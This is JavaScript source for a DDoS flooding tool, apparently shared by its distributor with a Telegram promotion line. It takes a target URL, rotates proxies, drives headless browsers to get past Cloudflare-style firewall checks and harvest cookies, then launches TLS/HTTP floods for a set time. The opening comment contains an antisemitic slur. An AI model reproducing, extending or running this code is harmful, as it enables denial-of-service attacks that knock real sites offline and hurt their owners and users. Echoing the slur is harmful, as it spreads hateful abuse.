/**
 * to the dev of the script: WHO THE FUCK MADE THIS PLEASE PLEASE PLEASE LEARN JS I'M GETTING FUCKING JEW CANCER
 */

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
(ignoreNames = [
  "RequestError",
  "StatusCodeError",
  "CaptchaError",
  "CloudflareError",
  "ParseError",
  "ParserError",
]),
  (ignoreCodes = [
    "ECONNRESET",
    "ERR_ASSERTION",
    "ECONNREFUSED",
    "EPIPE",
    "EHOSTUNREACH",
    "ETIMEDOUT",
    "ESOCKETTIMEDOUT",
    "EPROTO",
  ]);

process
  .on("uncaughtException", function (e) {
    if (
      (e.code && ignoreCodes.includes(e.code)) ||
      (e.name && ignoreNames.includes(e.name))
    )
      return false;
    console.warn(e);
  })
  .on("unhandledRejection", function (e) {
    if (
      (e.code && ignoreCodes.includes(e.code)) ||
      (e.name && ignoreNames.includes(e.name))
    )
      return false;
    console.warn(e);
  })
  .on("warning", (e) => {
    if (
      (e.code && ignoreCodes.includes(e.code)) ||
      (e.name && ignoreNames.includes(e.name))
    )
      return false;
    console.warn(e);
  })
  .on("SIGHUP", () => {
    return 1;
  })
  .on("SIGCHILD", () => {
    return 1;
  });

const request = require("request");
const { exec } = require("child_process");
const colors = require("colors");
const url = require("url");
const syncRequest = require("sync-request");
var arguments = require("minimist")(process.argv.slice(2));
const fs = require("fs");
let target = process.argv[2].split('""')[0];
const time = process.argv[3];
var parsed = url.parse(target);
var host = url.parse(target).host;

let totalBrowsers = 70;
let browserSaves = "";
let user_agent = "";
let attackMode = arguments.mode;
let postaMod = undefined;
let rff = undefined;
let cookieCtm = undefined;
let connections = arguments.conn;
let listIds = [];
let Idbrw = 0;
let idsRunned = [];
if (arguments.postdata) {
  if (arguments.postdata.includes("~")) {
    arguments.postdata = arguments.postdata.replace(/~/g, "&");
  }
  if (arguments.postdata.includes("*")) {
    arguments.postdata = arguments.postdata.replace(/\*/g, "%");
  }
}
if (arguments.customCookie) {
  if (arguments.customCookie.includes("~")) {
    arguments.customCookie = arguments.customCookie.replace(/~/g, ";");
  }
}
if (target.includes("*")) {
  target = target.replace(/\*/g, "%");
}

let typeAlert = 2;
let PROMOTION = "Updated by https://t.me/ackflood";

var proxyURL = `http://yourproxies/premium1.txt`;
var VarsDefinetions = {
  Objetive: target,
  VersionsHTTP: ["HTTP/1.1", "HTTP/1.2", "HTTP/1.3"],
  req_ip: process.argv[4] || 32,
  Method_raw: process.argv[5] || "GET",
  time: process.argv[3],
};

function add_uss(user) {
  user_agent = user;
}

function log(string) {
  let d = new Date();

  let hours = (d.getHours() < 10 ? "0" : "") + d.getHours();
  let minutes = (d.getMinutes() < 10 ? "0" : "") + d.getMinutes();
  let seconds = (d.getSeconds() < 10 ? "0" : "") + d.getSeconds();

  console.log(`[${hours}:${minutes}:${seconds}] ${string}`);
}

log(`Shit Method (v2) ` + `[ ${PROMOTION} ]`);
log(`Loading proxies..`);

try {
  if (proxyURL.indexOf("//") & proxyURL.indexOf(".")) {
    var res = syncRequest("GET", proxyURL, {
      headers: {
        "user-agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0",
      },
    });

    ProxyFILE = res.getBody("utf8").replace(/\r/g, "").split("\n");
  }
} catch (error) {
  ProxyFILE = fs.readFileSync("proxy.txt").toString().match(/\S+/g);
}
const proxies_total = ProxyFILE.length - 2;
log(`Loaded ${proxies_total + 2}`);

function ProxyGenerate() {
  return (proxy_obje = ProxyFILE[~~[Math.random() * proxies_total]]);
}

function brow_tokens(strings, proxy_co, ua_received) {
  if (
    browserSaves == null &&
    browserSaves == undefined &&
    browserSaves == ""
  ) {
    browserSaves +=
      "" + proxy_co + "#" + strings + "#" + ua_received + "" + ":::";
  } else {
    browserSaves +=
      "" + proxy_co + "#" + strings + "#" + ua_received + "" + ":::";
  }
}

var launch_browser = async function launch_browser(Extra = {}) {
  Idbrw++;
  let RunSessions = require("./browser/browserEngine.js");
  let IdBrowser = Extra.IdBrowser;
  const Proxy = Extra.Proxy;
  const intentNum = Extra.intentNum;
  const ProxyReopen = ProxyGenerate();

  const resposense = await RunSessions.RunSessions({
    IdBrowser: IdBrowser,
    Proxy: Proxy,
    Domain: VarsDefinetions.Objetive,
  });

  if (resposense == undefined) {
    log(
      "[error] [" +
        IdBrowser +
        "]" +
        ` Unknown error occured while trying to bypass firewall with ip: ${Proxy}`
    );
    listIds.push(IdBrowser);
    return;
  } else if (resposense == "error") {
    log(
      "[error] [" +
        IdBrowser +
        "]" +
        ` Error while trying to bypass firewall with ip: ${Proxy}`
    );
    listIds.push(IdBrowser);
    return;
  } else {
    if (typeAlert == 1) {
      log(`Browsers received (${browserSaves.split("#").length})`);
    } else if (typeAlert == 2) {
      log(
        `[info]` +
          ` Successfully bypassed firewall with ip: ${Proxy} | Cookies: ${
            resposense[IdBrowser].split(":::")[0]
          }`
      );
    } else {
      log("Invalid alert type.");
      return process.exit();
    }

    await setFlooder(
      Proxy,
      resposense[IdBrowser].split(":::")[0],
      resposense[IdBrowser].split(":::")[1]
    );
    listIds.push(IdBrowser);
  }
};

if (attackMode == "browser") {
  log(`Mode: ` + `${attackMode.toUpperCase()}`);
  log(`Total browsers to open: ` + `${totalBrowsers}`);
  log(`method: ` + `${VarsDefinetions.Method_raw}`);
  log(`postdata: ` + `${arguments.postdata || "false"}`);
  log(`cookie: ` + `${arguments.customCookie || "false"}`);
  log(`referer: ` + `${arguments.referer || "false"}`);
  log(`Launching browsers on: ` + `${target}`);
  let NumOPenBrowser = 10;
  var myInterval = setInterval(function () {
    //idsRunned: lista de ids ya lanzados
    if (listIds.length >= totalBrowsers) {
      //KillBrowsers();
      clearInterval(myInterval);
      log(`[success]` + ` Attcak proccess finished, idle set.`);
    } else if (listIds.length == idsRunned.length) {
      for (let j = 0; j < NumOPenBrowser; j++) {
        const Proxy = ProxyGenerate();
        idsRunned.push(Idbrw);
        launch_browser({ IdBrowser: Idbrw, Proxy: Proxy, intentNum: 0 });
      }

      log(`[info] Starting interval`);
    } else if (
      listIds.length == totalBrowsers &&
      listIds.length < (50 / 100) * totalBrowsers
    ) {
      log(`[success] Cookies recolected!`);
    }
  }, 0);
} else if (attackMode == "tls") {
  log(`[info] Mode: ${attackMode}`);
  log(`Target: ${target}`);
  require("./browser/flooder").TLSHTTP(
    (option = {
      target: VarsDefinetions.Objetive,
      host: host,
      RequestIP: VarsDefinetions.req_ip,
      proxies: ProxyFILE,
    })
  );
  log(`[info] Flooder started`);
} else {
  console.clear();
  log("Invalid mode selected, valid modes: tls, browser");
  process.exit();
}

function setFlooder(ip, cookie, ua) {
  if (arguments.postdata) {
    postaMod = encodeURI(arguments.postdata);
  }

  try {
    if (
      (arguments.referer.includes("//") == true) &
        (arguments.referer.includes(".") == true) &&
      arguments.referer.includes("//") == true
    ) {
      rff = arguments.referer;
    }
  } catch (error) {
    rff = target;
  }

  try {
    if (arguments.customCookie.includes("=") == true) {
      cookieCtm = ";" + arguments.customCookie;
    }
  } catch (error) {
    cookieCtm = "";
  }

  require("./browser/flooder.js").flooderTLS(
    (option = {
      ip: ip,
      cookie: cookie,
      ua: ua,
      host: host,
      rff: rff,
      target: VarsDefinetions.Objetive,
      RequestIP: VarsDefinetions.req_ip,
      userAgent: user_agent,
      addcookie: cookieCtm,
      TimeATTACK: VarsDefinetions.time,
      METHOD: VarsDefinetions.Method_raw,
      PostData: postaMod || undefined,
      connections: connections || 32,
    })
  );
  log(`[info]` + ` Flooder started with ${ip}`);
}

setTimeout(() => {
  console.clear();
  log(`Attacks Finished.`);
  process.exit(1);
}, VarsDefinetions.time * 1000);
